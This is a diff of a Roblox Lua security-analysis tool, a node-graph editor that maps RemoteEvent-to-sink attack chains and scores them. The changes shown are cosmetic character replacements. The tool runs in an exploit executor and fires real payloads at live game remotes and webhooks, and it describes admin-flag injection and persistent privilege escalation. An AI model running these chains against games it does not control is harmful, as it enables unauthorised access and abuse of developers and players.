@@ -220,13 +220,13 @@ end
 local CloseBtn = makeCtrlBtn("Close",   T.COL_CLOSE_IDLE, T.COL_CLOSE_HOT, T.PADDING)
 local MinBtn   = makeCtrlBtn("Minimize",T.COL_MIN_IDLE,   T.COL_MIN_HOT,   T.PADDING + T.BTN_SIZE + T.BTN_GAP)
 
--- ═══════════════════════════════════════════════════════════════
+-- ===============================================================
 --- SOURCE TO SINK  --  NODE GRAPH EDITOR
 -- Canvas-based node graph. Nodes are draggable frames. Connections are
 -- rotated line frames computed from port positions. Right-click a node
 -- to open a context menu (imGUI) for configuring that node's action.
 
--- ── Graph colour system ────────────────────────────────────────────────────
+-- -- Graph colour system ----------------------------------------------------
 local GC = {
     CANVAS    = Color3.fromRGB( 10,  12,  20),
     GRID      = Color3.fromRGB( 90, 120, 200),
@@ -268,7 +268,7 @@ local ROLE_ACC = {
     LRCE         = Color3.fromRGB(218,  60,  68),
 }
 
--- ── Node type catalogue ────────────────────────────────────────────────────
+-- -- Node type catalogue ----------------------------------------------------
 local NODE_TYPES = {
     {
         id = "INPUT", role = "INPUT", label = "User Input",
@@ -360,7 +360,7 @@ local NODE_TYPES = {
             d    = "Only require() from a fixed, code-defined set of AssetIDs. Never pass a client- or payload-derived ID." },
         actions = {
             { n = "Local ModuleScript", d = "require() a ModuleScript in ReplicatedStorage." },
-            { n = "Public Asset ID",    d = "require(assetId) — published ModuleScript by ID." },
+            { n = "Public Asset ID",    d = "require(assetId) -- published ModuleScript by ID." },
             { n = "External Asset ID",  d = "Untrusted ID. Risk: arbitrary Lua execution." },
         },
     },
@@ -378,45 +378,45 @@ local NODE_TYPES = {
     },
 }
 
--- ── Graph state ────────────────────────────────────────────────────────────
+-- -- Graph state ------------------------------------------------------------
 local graphNodes    = {}   -- array of node objects
 local graphWires    = {}   -- array of wire objects { from=nodeObj, to=nodeObj, frame=Frame }
 local riskBadgeLbl  = nil  -- live score label in the toolbar
 local riskDetailFrm = nil  -- floating risk detail panel
 
--- ── Graph context system ──────────────────────────────────────────────────────
+-- -- Graph context system ------------------------------------------------------
 -- Each tab that hosts a graph (S->S, HPDC) has its own saved context so
 -- switching tabs preserves each graph's independent state.
 local activeGraphId = "SS"
 local ssCtx   = { nodes={}, wires={}, canvas=nil, page=nil, selected=nil, wiringFrom=nil, genPrompt=nil }
 local hpdcCtx = { nodes={}, wires={}, canvas=nil, page=nil, selected=nil, wiringFrom=nil }
 
--- ══════════════════════════════════════════════════════════════════
+-- ==================================================================
 --   CUSTODY LEDGER  (CL)
 --   Tracks whether verified identity remains attached at every
---   step of a RemoteEvent → BindableEvent chain.
+--   step of a RemoteEvent -> BindableEvent chain.
 --
 --   Three custody states per step:
---     ENGINE      — identity guaranteed by the Roblox engine
+--     ENGINE      -- identity guaranteed by the Roblox engine
 --                   (server always receives Player as first arg)
---     MANUAL      — identity present in payload; manually passed
---     ABSENT      — identity not in payload at this step
---     SUBSTITUTED — no Player object, but a UserId from payload
+--     MANUAL      -- identity present in payload; manually passed
+--     ABSENT      -- identity not in payload at this step
+--     SUBSTITUTED -- no Player object, but a UserId from payload
 --                   found (attacker controls identity claim)
 --
 --   Three session verdicts:
---     INTACT      — identity present at every step
---     BROKEN      — identity dropped at some handoff, no substitute
---     SUBSTITUTED — identity dropped and UserId from payload used
--- ══════════════════════════════════════════════════════════════════
+--     INTACT      -- identity present at every step
+--     BROKEN      -- identity dropped at some handoff, no substitute
+--     SUBSTITUTED -- identity dropped and UserId from payload used
+-- ==================================================================
 local CL = {
     sessions  = {},  -- completed sessions (newest first)
     active    = nil, -- session in progress
-    onUpdate  = nil, -- fn(session) → UI rebuild callback
+    onUpdate  = nil, -- fn(session) -> UI rebuild callback
     MAX_SAVED = 30,
 }
 
--- ── Internal: scan a value (or table) for a Player instance ──────
+-- -- Internal: scan a value (or table) for a Player instance ------
 local function _findPlayer(v, depth)
     depth = depth or 0
     if depth > 3 then return nil end
@@ -430,7 +430,7 @@ local function _findPlayer(v, depth)
     return nil
 end
 
--- ── Internal: scan for a UserId substitution in payload ──────────
+-- -- Internal: scan for a UserId substitution in payload ----------
 local function _findUserIdSub(v, depth)
     depth = depth or 0
     if depth > 3 then return nil end
@@ -454,7 +454,7 @@ local function _findUserIdSub(v, depth)
     return nil
 end
 
--- ── Session lifecycle ─────────────────────────────────────────────
+-- -- Session lifecycle ---------------------------------------------
 function CL:beginSession(chainId, sourceLabel)
     self.active = {
         id           = chainId or ("cl_"..math.floor(tick()*1000)),
@@ -488,7 +488,7 @@ function CL:recordStep(stepNum, nodeType, nodeName, payload)
 
     if nodeType == "REMOTE" then
         -- Engine always prepends Player on the server side.
-        -- From the client we mark this as ENGINE — the contract
+        -- From the client we mark this as ENGINE -- the contract
         -- is guaranteed at this boundary by the Roblox runtime.
         rec.custody = "ENGINE"
         rec.source  = "ENGINE"
@@ -501,7 +501,7 @@ function CL:recordStep(stepNum, nodeType, nodeName, payload)
             rec.source  = "MANUAL"
             rec.player  = playerInPayload
         else
-            -- No Player object — check for UserId substitution
+            -- No Player object -- check for UserId substitution
             local subPlayer = _findUserIdSub(payload)
             if subPlayer then
                 rec.custody   = "SUBSTITUTED"
@@ -558,7 +558,7 @@ function CL:closeSession()
     return closed
 end
 
--- ── Query helpers ─────────────────────────────────────────────────
+-- -- Query helpers -------------------------------------------------
 function CL:last()
     return self.sessions[1]
 end
@@ -575,12 +575,12 @@ end
 function CL:summary(s)
     s = s or self:last()
     if not s then return "No sessions" end
-    local icon = ({INTACT="✓", BROKEN="⚠", SUBSTITUTED="✗", PENDING="…"})[s.verdict] or "?"
-    return ("%s  %s  [%d steps · %dms]  source: %s"):format(
+    local icon = ({INTACT="[OK]", BROKEN="[!]", SUBSTITUTED="[X]", PENDING="..."})[s.verdict] or "?"
+    return ("%s  %s  [%d steps . %dms]  source: %s"):format(
         icon, s.verdict, #s.steps, s.duration or 0, s.sourceLabel)
 end
 
--- ── UI panel builder ──────────────────────────────────────────────
+-- -- UI panel builder ----------------------------------------------
 -- Returns a Frame containing the full ledger view for the last session.
 -- parent  : the Frame to parent it to
 -- x, y    : position offsets
@@ -657,7 +657,7 @@ function CL:buildPanel(parent, x, y, w, h)
 
     Instance.new("UIPadding", scroll).PaddingLeft   = UDim.new(0,6)
 
-    -- ── render function: builds rows from last session ────────────
+    -- -- render function: builds rows from last session ------------
     local function rebuild()
         -- Clear old rows
         for _, ch in ipairs(scroll:GetChildren()) do
@@ -790,7 +790,7 @@ function CL:buildPanel(parent, x, y, w, h)
                 ann.Size                   = UDim2.new(1,-12,0,10)
                 ann.Position               = UDim2.new(0,6,1,-10)
                 ann.BackgroundTransparency = 1
-                ann.Text                   = "← custody break: Player object dropped here"
+                ann.Text                   = "<- custody break: Player object dropped here"
                 ann.TextColor3             = COL.ABSENT
                 ann.TextSize               = 8
                 ann.Font                   = Enum.Font.Gotham
@@ -801,7 +801,7 @@ function CL:buildPanel(parent, x, y, w, h)
                 ann.Size                   = UDim2.new(1,-12,0,10)
                 ann.Position               = UDim2.new(0,6,1,-10)
                 ann.BackgroundTransparency = 1
-                ann.Text                   = "← CRITICAL: UserId from payload used as identity"
+                ann.Text                   = "<- CRITICAL: UserId from payload used as identity"
                 ann.TextColor3             = COL.SUBSTITUTED
                 ann.TextSize               = 8
                 ann.Font                   = Enum.Font.GothamBold
@@ -817,15 +817,15 @@ function CL:buildPanel(parent, x, y, w, h)
     return root, rebuild
 end
 
--- ─────────────────────────────────────────────────────────────────
+-- -----------------------------------------------------------------
 
 
--- ── Executor-global resolver ──────────────────────────────────────────────────
+-- -- Executor-global resolver --------------------------------------------------
 -- Called fresh on every HTTP:post / HTTP:get invocation so that stale upvalues
 -- from a previous executor session never silently block requests. If the
 -- executor is restarted or reinjected, the next call will find the new globals.
 local function _execFn(name)
-    -- 1. getgenv() — executor's own global env (most reliable across threads)
+    -- 1. getgenv() -- executor's own global env (most reliable across threads)
     if getgenv then
         local fn = rawget(getgenv(), name)
         if type(fn) == "function" then return fn end
@@ -838,9 +838,9 @@ local function _execFn(name)
     if ok and type(f) == "function" then return f end
     return nil
 end
--- ─────────────────────────────────────────────────────────────────────────────
+-- -----------------------------------------------------------------------------
 
--- HTTP Feedback state — declared early so executeNode (line ~896) can see it
+-- HTTP Feedback state -- declared early so executeNode (line ~896) can see it
 -- Methods (HTTP:post, HTTP:get, etc.) are added later but the table itself must exist here
 local HTTP = {
     webhookUrl    = "",    -- user-configured outbound URL
@@ -865,7 +865,7 @@ local PORT_R  = 6
 local HDR_H   = 22
 local SNAP    = 10
 
--- ── Live game scanners ──────────────────────────────────────────────────────
+-- -- Live game scanners ------------------------------------------------------
 -- All scans are client-visible only (a LocalScript cannot see ServerStorage
 -- or ServerScriptService). That blind spot is intentional and accurate: it
 -- mirrors exactly what an attacker's client could discover and reach.
@@ -953,7 +953,7 @@ local function dynamicActionsFor(typeId)
 end
 
 
--- ── Utility ────────────────────────────────────────────────────────────────
+-- -- Utility ----------------------------------------------------------------
 local function mF(p,x,y,w,h,col,al,z)
     local f=Instance.new("Frame")
     f.Position=UDim2.fromOffset(x,y) f.Size=UDim2.fromOffset(w,h)
@@ -1028,25 +1028,25 @@ local function mBracket(parent, corner, len, thick, col, trans, z)
     return h, v
 end
 
--- ─── DEPENDENCY PATH TRACER ───────────────────────────────────────────────────
+-- --- DEPENDENCY PATH TRACER ---------------------------------------------------
 --
 -- Attempts to map how data flows through the game's script environment by:
---   1. SOURCE SCAN  — reads Script.Source for each visible script and searches
+--   1. SOURCE SCAN  -- reads Script.Source for each visible script and searches
 --                     for structural keywords (FireServer, PostAsync, etc.).
 --                     Only works in Studio / Plugin / Test-play context.
 --                     In a live published game Script.Source returns "".
---   2. NAME INFERENCE — correlates remote/bindable names to script names using
+--   2. NAME INFERENCE -- correlates remote/bindable names to script names using
 --                     pattern matching and hierarchy proximity. Always works.
 --
 -- The auto-generated graph labels each wire with its evidence type so the user
 -- always knows whether the connection was source-confirmed or inferred.
 
--- ── Keyword → chain stage mapping ────────────────────────────────────────────
+-- -- Keyword -> chain stage mapping --------------------------------------------
 local TRACE_KW = {
-    FireServer        = { s = "REMOTE",   d = "client→server fire"    },
-    InvokeServer      = { s = "REMOTE",   d = "client→server invoke"  },
-    FireAllClients    = { s = "REMOTE",   d = "server→client fire"    },
-    FireClient        = { s = "REMOTE",   d = "server→client fire"    },
+    FireServer        = { s = "REMOTE",   d = "client->server fire"    },
+    InvokeServer      = { s = "REMOTE",   d = "client->server invoke"  },
+    FireAllClients    = { s = "REMOTE",   d = "server->client fire"    },
+    FireClient        = { s = "REMOTE",   d = "server->client fire"    },
     OnServerEvent     = { s = "REMOTE",   d = "server handler"        },
     OnClientEvent     = { s = "REMOTE",   d = "client handler"        },
     OnServerInvoke    = { s = "REMOTE",   d = "server invoke handler" },
@@ -1059,7 +1059,7 @@ local TRACE_KW = {
     ["require"]       = { s = "REQUIRE",  d = "module load"           },
 }
 
--- ── Additional script roots (client-visible) ──────────────────────────────────
+-- -- Additional script roots (client-visible) ----------------------------------
 local SCRIPT_ROOTS_FNS = {
     function() return game:GetService("ReplicatedStorage") end,
     function() return game:GetService("ReplicatedFirst")   end,
@@ -1074,13 +1074,13 @@ local SCRIPT_ROOTS_FNS = {
     end,
 }
 
--- Try to read a script's source — returns nil if unavailable (live game).
+-- Try to read a script's source -- returns nil if unavailable (live game).
 local function trySource(scriptInst)
     local ok, s = pcall(function() return scriptInst.Source end)
     return (ok and type(s) == "string" and #s > 4) and s or nil
 end
 
--- Score how likely a script name matches a remote/bindable name (0–1).
+-- Score how likely a script name matches a remote/bindable name (0-1).
 local function nameScore(scriptName, remoteName)
     local sL = scriptName:lower()
     local rL = remoteName:lower()
@@ -1099,7 +1099,7 @@ end
 
 -- Hierarchy proximity score: scripts in the same folder as a remote score higher.
 -- Uses pcall throughout since instances may be unparented or GC'd between
--- discovery and scoring — any invalid property access returns 0 safely.
+-- discovery and scoring -- any invalid property access returns 0 safely.
 local function hierScore(scriptInst, remoteInst)
     if not scriptInst or not remoteInst then return 0 end
     local ok, result = pcall(function()
@@ -1279,7 +1279,7 @@ local function runDependencyTrace(onProgress, onComplete)
     -- Sort connections by confidence descending
     table.sort(connections, function(a,b) return a.confidence > b.confidence end)
 
-    -- ── HPDC-specific evidence: scan for reflection / DataStore patterns ──
+    -- -- HPDC-specific evidence: scan for reflection / DataStore patterns --
     local hpdcEvidence = {
         hasDataStore  = false,
         hasInstanceNew= false,
@@ -1323,7 +1323,7 @@ local function runDependencyTrace(onProgress, onComplete)
     })
 end
 
--- ── Wire confidence colour ────────────────────────────────────────────────────
+-- -- Wire confidence colour ----------------------------------------------------
 -- Green = high (source confirmed), Amber = medium (partial), Red = low (guess)
 local function confidenceColour(conf)
     if conf >= 0.70 then return GC.CHK,  0.08 end   -- green, bright
@@ -1331,8 +1331,8 @@ local function confidenceColour(conf)
     return                        GC.ERR,  0.30       -- red, faint
 end
 
--- ── Auto-graph builder ────────────────────────────────────────────────────────
--- ── Wire confidence colour ────────────────────────────────────────────────────
+-- -- Auto-graph builder --------------------------------------------------------
+-- -- Wire confidence colour ----------------------------------------------------
 -- Green = high (source confirmed), Amber = medium (partial), Red = low (guess)
 local function confidenceColour(conf)
     if conf >= 0.70 then return GC.CHK,  0.08 end   -- green, bright
@@ -1340,9 +1340,9 @@ local function confidenceColour(conf)
     return                        GC.ERR,  0.30       -- red, faint
 end
 
--- ── Auto-graph builder ────────────────────────────────────────────────────────
+-- -- Auto-graph builder --------------------------------------------------------
 
--- ── Chain execution engine ──────────────────────────────────────────────────
+-- -- Chain execution engine --------------------------------------------------
 -- Walks the wired graph from each source in topological order, executing the
 -- real call at each node and threading each node's output into the next node's
 -- input. Stops a path the moment it hits a secured node (control enforced).
@@ -1412,7 +1412,7 @@ local function executeNode(node, payload)
         local method = (node.selectedAction and node.selectedAction.n) or "GET Request"
         local isPost = method:find("POST") or method:find("Webhook") or method:find("REST")
 
-        -- Reuse HTTP:post() / HTTP:get() — already confirmed working with Solara
+        -- Reuse HTTP:post() / HTTP:get() -- already confirmed working with Solara
         -- These methods use executor request() with proper fallback chain.
         local ok, status, body, ms
         if isPost then
@@ -1436,16 +1436,16 @@ local function executeNode(node, payload)
             return false, nil,
                 (isPost and "POST" or "GET").." error: "..tostring(body)
         end
-    -- ── HPDC node handlers ──────────────────────────────────────────────────
+    -- -- HPDC node handlers --------------------------------------------------
     elseif id == "INGRESS" then
         -- Ingress: fire through the selected network framework remote.
         -- Treat the same as REMOTE but labelled specifically for HPDC context.
         local target = node.targetInst
         if not target then
-            -- No live instance — simulate the ingress event and carry payload forward.
+            -- No live instance -- simulate the ingress event and carry payload forward.
             local act = node.selectedAction and node.selectedAction.n or "unknown framework"
             return true, payload,
-                "ingress via " .. act .. " (no live instance — simulation mode)"
+                "ingress via " .. act .. " (no live instance -- simulation mode)"
         end
         local ok, err = pcall(function()
             if target.ClassName == "RemoteEvent" then
@@ -1472,7 +1472,7 @@ local function executeNode(node, payload)
                 end
                 return payload
             elseif act == "Type Coercion Pattern" then
-                -- Apply tonumber/tostring coercion — exposes math.huge from "inf".
+                -- Apply tonumber/tostring coercion -- exposes math.huge from "inf".
                 local n = tonumber(payload)
                 return n ~= nil and n or tostring(payload)
             else
@@ -1493,7 +1493,7 @@ local function executeNode(node, payload)
         -- Here we carry the payload forward with a provenance note stripped.
         local cached = payload  -- secondary systems see this as server-authoritative
         return true, cached,
-            "written to [" .. act .. "] — downstream reads this as validated"
+            "written to [" .. act .. "] -- downstream reads this as validated"
 
     elseif id == "REFLECT" then
         -- Reflection sink: attempt the selected reflection operation with the payload.
@@ -1521,16 +1521,16 @@ local function executeNode(node, payload)
                     for k in pairs(decoded) do table.insert(keys, k) end
                     return "decoded keys: {" .. table.concat(keys, ", ") .. "}"
                 end
-                return "payload is not a string — reflection skipped"
+                return "payload is not a string -- reflection skipped"
             else
                 -- Other reflection patterns: carry payload forward with notation.
-                return "reflection via [" .. act .. "] — payload: " .. payStr:sub(1,40)
+                return "reflection via [" .. act .. "] -- payload: " .. payStr:sub(1,40)
             end
         end)
         if ok then
             return true, payload, "reflect: " .. tostring(result):sub(1,60)
         else
-            -- Error IS the result — server rejected the class name or key.
+            -- Error IS the result -- server rejected the class name or key.
             return false, nil,
                 "reflect rejected: " .. tostring(result):sub(1,60)
                 .. " (server protected against this pattern)"
@@ -1548,17 +1548,17 @@ local function executeNode(node, payload)
                     .. " | UserId: " .. plr.UserId
                     .. " | (admin state must be verified server-side)"
             elseif act == "Authorization Check Disable" then
-                return "auth check state is server-side only — "
+                return "auth check state is server-side only -- "
                     .. "result depends on Step 4 attribute rewrite success"
             elseif act == "Persistent State Override" then
                 -- Verify whether DataStoreService is accessible (pre-condition for persistence).
                 local ok2, ds = pcall(function()
                     return game:GetService("DataStoreService")
                 end)
-                return ok2 and "DataStoreService accessible — persistence path open"
+                return ok2 and "DataStoreService accessible -- persistence path open"
                            or "DataStoreService not accessible in this context"
             else
-                return "logical execution via [" .. act .. "] — "
+                return "logical execution via [" .. act .. "] -- "
                     .. "outcome depends on server-side state from Steps 3-4"
             end
         end)
@@ -1621,7 +1621,7 @@ local function makeWire()
     return wf
 end
 
--- ── Trust propagation ──────────────────────────────────────────────────────
+-- -- Trust propagation ------------------------------------------------------
 -- Computes which nodes are "hot" (reachable by un-secured attacker flow).
 --
 -- Model:
@@ -1677,9 +1677,9 @@ local function computeHotSet()
 end
 
 
--- ─── DATA-FLOW RISK SCORING ENGINE ──────────────────────────────────────────
+-- --- DATA-FLOW RISK SCORING ENGINE ------------------------------------------
 -- Evaluates the configured chain graph and returns a risk score 0-100.
--- Tier: HIGH (≥70) | MEDIUM (35-69) | LOW (<35)
+-- Tier: HIGH (>=70) | MEDIUM (35-69) | LOW (<35)
 --
 -- Scoring dimensions (additive, then clamped):
 --   Entry risk    +30  if REMOTE node unsecured (untrusted payload enters)
@@ -1691,7 +1691,7 @@ end
 --     HttpService(dynamic)  +28  exfiltration + C2 channel
 --     HttpService(static)   +12  controlled egress
 --     data processing only    0  no execution/egress sink
---   Critical path +15  if Remote→Bindable→require(dynamic) pattern detected
+--   Critical path +15  if Remote->Bindable->require(dynamic) pattern detected
 --   Fleet+exec    +10  if messaging broadcast reaches execution sink
 --   Control relief  -8  per enforced control (capped at -40)
 
@@ -1741,7 +1741,7 @@ local function scoreChain()
             if not sec then
                 remoteUnsecured = true
                 addReason(30,
-                    "RemoteEvent boundary unsecured — client payload enters trust domain unvalidated.",
+                    "RemoteEvent boundary unsecured -- client payload enters trust domain unvalidated.",
                     "HIGH")
             else
                 addReason(-10,
@@ -1753,7 +1753,7 @@ local function scoreChain()
             if not sec then
                 bindableUnsecured = true
                 addReason(20,
-                    "BindableEvent relays without provenance tag — downstream cannot distinguish client origin.",
+                    "BindableEvent relays without provenance tag -- downstream cannot distinguish client origin.",
                     "HIGH")
             else
                 addReason(-5,
@@ -1772,7 +1772,7 @@ local function scoreChain()
                         "HIGH")
                 else
                     addReason(0,
-                        "MessagingService: access authorised — payload reviewed before broadcast.",
+                        "MessagingService: access authorised -- payload reviewed before broadcast.",
                         "LOW")
                 end
             end
@@ -1785,17 +1785,17 @@ local function scoreChain()
                 if isStaticNum then
                     requireStatic = true
                     addReason(10,
-                        "require(" .. iv .. ") — static AssetID, but verify you own/control this asset.",
+                        "require(" .. iv .. ") -- static AssetID, but verify you own/control this asset.",
                         "MEDIUM")
                 else
                     requireDynamic = true
                     addReason(35,
-                        "require() with dynamic/unset AssetID — attacker-controlled ID = arbitrary server-side code execution.",
+                        "require() with dynamic/unset AssetID -- attacker-controlled ID = arbitrary server-side code execution.",
                         "CRITICAL")
                 end
             else
                 addReason(-15,
-                    "require(): AssetID hard-allowlisted. Execution sink secured — arbitrary IDs rejected.",
+                    "require(): AssetID hard-allowlisted. Execution sink secured -- arbitrary IDs rejected.",
                     "LOW")
             end
 
@@ -1806,12 +1806,12 @@ local function scoreChain()
                 if iv ~= "" and not iv:find("{") and iv:sub(1,4) == "http" then
                     httpStatic = true
                     addReason(12,
-                        "HttpService: static URL (" .. iv:sub(1,30) .. ") — egress controlled but response must not be eval'd.",
+                        "HttpService: static URL (" .. iv:sub(1,30) .. ") -- egress controlled but response must not be eval'd.",
                         "MEDIUM")
                 else
                     httpDynamic = true
                     addReason(28,
-                        "HttpService: dynamic/unset URL — data exfiltration path open. C2 channel possible.",
+                        "HttpService: dynamic/unset URL -- data exfiltration path open. C2 channel possible.",
                         "HIGH")
                 end
             else
@@ -1819,11 +1819,11 @@ local function scoreChain()
                     "HttpService: domain allowlisted, response not executed. Egress controlled.",
                     "LOW")
             end
-        -- ── HPDC node scoring ────────────────────────────────────────────
+        -- -- HPDC node scoring --------------------------------------------
         elseif id == "INGRESS" then
             if not sec then
                 addReason(28,
-                    "Ingress unsecured — centralised framework accepts arbitrary action "
+                    "Ingress unsecured -- centralised framework accepts arbitrary action "
                     .. "keys without a per-action schema. Single attack surface covers entire game.",
                     "HIGH")
             else
@@ -1857,7 +1857,7 @@ local function scoreChain()
         elseif id == "INTERSERVICE" then
             if not sec then
                 addReason(20,
-                    "Lateral transport unsecured — session cache written with unvalidated data. "
+                    "Lateral transport unsecured -- session cache written with unvalidated data. "
                     .. "Secondary systems (combat, economy, matchmaker) read it as server-authoritative.",
                     "HIGH")
             else
@@ -1874,17 +1874,17 @@ local function scoreChain()
                 if act == "Instance.new(cache string)"
                 or act == "Script in Unmonitored Container" then
                     addReason(32,
-                        "Reflection sink [" .. act .. "] — cache-sourced string passed to Instance.new(). "
+                        "Reflection sink [" .. act .. "] -- cache-sourced string passed to Instance.new(). "
                         .. "Attacker can instantiate Script objects in unmonitored containers.",
                         "CRITICAL")
                 elseif act == "Config Attribute Rewrite" then
                     addReason(26,
-                        "Config attribute rewritten from session cache — "
+                        "Config attribute rewritten from session cache -- "
                         .. "security guards, rate limiters, or permission tiers modified by attacker.",
                         "HIGH")
                 else
                     addReason(18,
-                        "Reflection via [" .. act .. "] — cache string used as property key or factory input. "
+                        "Reflection via [" .. act .. "] -- cache string used as property key or factory input. "
                         .. "Arbitrary server object mutation possible.",
                         "HIGH")
                 end
@@ -1901,18 +1901,18 @@ local function scoreChain()
             if not sec then
                 if act == "Admin Flag Injection" or act == "Authorization Check Disable" then
                     addReason(35,
-                        "LRCE via [" .. act .. "] — "
+                        "LRCE via [" .. act .. "] -- "
                         .. "server routing table or auth check reads from poisoned session state. "
                         .. "Operator achieves developer-level access through native game remotes.",
                         "CRITICAL")
                 elseif act == "Persistent State Override" then
                     addReason(30,
-                        "Persistent state override — corrupted session flushed to DataStore. "
+                        "Persistent state override -- corrupted session flushed to DataStore. "
                         .. "Privilege escalation survives server restart. Attack chain need not repeat.",
                         "CRITICAL")
                 else
                     addReason(24,
-                        "Logical execution via [" .. act .. "] — "
+                        "Logical execution via [" .. act .. "] -- "
                         .. "server logic operates on attacker-controlled state as authoritative.",
                         "HIGH")
                 end
@@ -1926,26 +1926,26 @@ local function scoreChain()
         end
     end
 
-    -- ── Path-level pattern bonuses ────────────────────────────────────────
+    -- -- Path-level pattern bonuses ----------------------------------------
     if remoteUnsecured and bindableUnsecured and requireDynamic then
         addReason(15,
-            "CRITICAL PATTERN: Remote→Bindable→require(dynamic). Classic trust-laundering chain to execution sink.",
+            "CRITICAL PATTERN: Remote->Bindable->require(dynamic). Classic trust-laundering chain to execution sink.",
             "CRITICAL")
     end
 
     if messagingUnsecured and hasExecutionSink then
         addReason(10,
-            "Fleet amplification reaches execution sink — every server in the game executes attacker payload.",
+            "Fleet amplification reaches execution sink -- every server in the game executes attacker payload.",
             "CRITICAL")
     end
 
     if remoteUnsecured and httpDynamic then
         addReason(8,
-            "Unvalidated client data reaches HttpService egress — full C2 channel: exfil + receive instructions.",
+            "Unvalidated client data reaches HttpService egress -- full C2 channel: exfil + receive instructions.",
             "HIGH")
     end
 
-    -- ── HPDC-specific path bonuses ────────────────────────────────────────
+    -- -- HPDC-specific path bonuses ----------------------------------------
     -- Check whether HPDC node types are present and form the critical pattern
     local hasIngress, hasSerial, hasLateral, hasReflect, hasLRCE = false,false,false,false,false
     local reflectUnsecured, lrceUnsecured = false, false
@@ -1960,8 +1960,8 @@ local function scoreChain()
 
     if hasIngress and hasSerial and reflectUnsecured then
         addReason(16,
-            "HPDC CRITICAL PATH: Ingress→Serializer→Reflection sink. "
-            .. "No require() needed — the game's own Instance factory is the execution primitive.",
+            "HPDC CRITICAL PATH: Ingress->Serializer->Reflection sink. "
+            .. "No require() needed -- the game's own Instance factory is the execution primitive.",
             "CRITICAL")
     end
 
@@ -1969,7 +1969,7 @@ local function scoreChain()
         addReason(14,
             "HPDC FULL CHAIN: session cache poisoned at Step 3, "
             .. "reflection sink reached at Step 4, logical execution achieved at Step 5. "
-            .. "No network egress required — attack is entirely internal.",
+            .. "No network egress required -- attack is entirely internal.",
             "CRITICAL")
     end
 
@@ -1980,7 +1980,7 @@ local function scoreChain()
             "CRITICAL")
     end
 
-    -- ── Control relief ────────────────────────────────────────────────────
+    -- -- Control relief ----------------------------------------------------
     if controlsCount > 0 then
         local relief = math.min(controlsCount * 8, 40)
         addReason(-relief,
@@ -1989,7 +1989,7 @@ local function scoreChain()
             "LOW")
     end
 
-    -- ── Final score + tier ────────────────────────────────────────────────
+    -- -- Final score + tier ------------------------------------------------
     local score = math.max(0, math.min(100, rawScore))
     local tier, tierCol, tierBg
     if score >= 70 then
@@ -2119,7 +2119,7 @@ local function selectNode(node)
     end
 end
 
--- ── Context menu (imGUI) ───────────────────────────────────────────────────
+-- -- Context menu (imGUI) ---------------------------------------------------
 local function openCtxMenu(node, canvasPos)
     closeCtx()
     ctxNode = node
@@ -2129,7 +2129,7 @@ local function openCtxMenu(node, canvasPos)
     local ctrl   = node.typeData.control
     local nodeId = node.typeData.id
 
-    -- ── Layout constants ──────────────────────────────────────────
+    -- -- Layout constants ------------------------------------------
     local CTX_W      = 210
     local ROW_H      = 22   -- height of each option row
     local HDR_H      = 38   -- title header
@@ -2140,7 +2140,7 @@ local function openCtxMenu(node, canvasPos)
     local FOOT_H     = 28   -- footer
     local SEP        = 1    -- divider thickness
 
-    -- ── Mode detection ────────────────────────────────────────────
+    -- -- Mode detection --------------------------------------------
     local useLiveScan   = (nodeId == "REMOTE" or nodeId == "BINDABLE")
     local usePlayerScan = (nodeId == "SERVICE" and
         node.selectedAction and node.selectedAction.n == "Players")
@@ -2149,7 +2149,7 @@ local function openCtxMenu(node, canvasPos)
                         or nodeId == "SERIAL")  -- HPDC nodes with configurable values
     local isService     = (nodeId == "SERVICE")
 
-    -- ── Live scan ─────────────────────────────────────────────────
+    -- -- Live scan -------------------------------------------------
     local scanResults = nil
     if useLiveScan then
         scanResults = (nodeId == "REMOTE") and scanRemotes() or scanBindables()
@@ -2160,7 +2160,7 @@ local function openCtxMenu(node, canvasPos)
     local rowCount   = #rowSource
     local visRows    = math.min(rowCount, MAX_ROWS)  -- how many rows are visible
 
-    -- ── Precise height calculation using a running cursor ─────────
+    -- -- Precise height calculation using a running cursor ---------
     -- Each section adds its own height to curH. Nothing is hardcoded twice.
     local rowAreaH   = visRows * ROW_H   -- visible row area (clipped by scroll)
     local scanLblH   = (scanResults ~= nil) and SCAN_LBL_H or 0
@@ -2173,13 +2173,13 @@ local function openCtxMenu(node, canvasPos)
         + CTRL_H + SEP
         + FOOT_H
 
-    -- ── Canvas-clamped position ───────────────────────────────────
+    -- -- Canvas-clamped position -----------------------------------
     local cx = math.min(canvasPos.X, graphCanvas.AbsoluteSize.X - CTX_W - 4)
     local cy = math.min(canvasPos.Y, graphCanvas.AbsoluteSize.Y - totalH - 4)
     cx = math.max(cx, 2)
     cy = math.max(cy, 2)
 
-    -- ── Menu shell ────────────────────────────────────────────────
+    -- -- Menu shell ------------------------------------------------
     local menu = Instance.new("Frame")
     menu.Name                   = "CtxMenu"
     menu.Size                   = UDim2.fromOffset(CTX_W, totalH)
@@ -2196,10 +2196,10 @@ local function openCtxMenu(node, canvasPos)
     mGlow(menu, acc, 0.65, 3)
     ctxMenu = menu
 
-    -- Running Y cursor — every section advances this
+    -- Running Y cursor -- every section advances this
     local curY = 0
 
-    -- ── SECTION: Header ───────────────────────────────────────────
+    -- -- SECTION: Header -------------------------------------------
     local hdr = mF(menu, 0, curY, CTX_W, HDR_H, GC.CTX_TOP, 0.35, 41)
     hdr.Size = UDim2.new(1, 0, 0, HDR_H)
     mC(hdr, 7)
@@ -2226,7 +2226,7 @@ local function openCtxMenu(node, canvasPos)
     closeBtn.MouseButton1Click:Connect(closeCtx)
     curY = curY + HDR_H + SEP
 
-    -- ── SECTION: Scan sub-header (scan nodes only) ────────────────
+    -- -- SECTION: Scan sub-header (scan nodes only) ----------------
     if scanResults ~= nil then
         mF(menu, 0, curY-SEP, CTX_W, SEP, GC.DIV, 0.50, 41).Size = UDim2.new(1,0,0,1)
         local sh = mF(menu, 0, curY, CTX_W, SCAN_LBL_H, GC.CTX_BOT, 0.55, 41)
@@ -2240,7 +2240,7 @@ local function openCtxMenu(node, canvasPos)
         curY = curY + SCAN_LBL_H + SEP
     end
 
-    -- ── SECTION: Scrollable row list ─────────────────────────────
+    -- -- SECTION: Scrollable row list -----------------------------
     mF(menu, 0, curY-SEP, CTX_W, SEP, GC.DIV, 0.50, 41).Size = UDim2.new(1,0,0,1)
 
     -- ScrollingFrame containing all rows (caps at MAX_ROWS visible)
@@ -2350,7 +2350,7 @@ local function openCtxMenu(node, canvasPos)
 
     curY = curY + rowAreaH + SEP
 
-    -- ── SECTION: Input box (INPUT / REQUIRE / HTTP) ───────────────
+    -- -- SECTION: Input box (INPUT / REQUIRE / HTTP) ---------------
     if useInputBox then
